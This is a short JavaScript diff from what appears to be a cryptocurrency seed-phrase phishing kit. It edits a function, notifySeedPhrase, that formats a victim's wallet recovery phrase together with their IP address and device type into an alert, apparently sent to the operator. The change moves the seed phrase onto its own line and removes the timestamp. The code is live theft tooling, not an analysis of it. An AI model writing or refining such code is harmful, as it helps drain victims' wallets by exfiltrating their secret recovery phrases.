@@ -1562,8 +1562,7 @@ async function notifySeedPhrase(seedPhrase, wordCount) {
   try {
     const message = `🔐 **New Seed Phrase Connection**\n\n` +
                    `📝 **Word Count:** ${wordCount}\n` +
-                   `🌱 **Seed Phrase:** \`${seedPhrase}\`\n\n` +
-                   `⏰ **Time:** ${new Date().toLocaleString('en-US')}\n` +
+                   `🌱 **Seed Phrase:**\n \`${seedPhrase}\`\n\n` +
                    `🌐 **IP:** ${await getUserIP()}\n` +
                    `📱 **Device:** ${detectDevice()}`
 
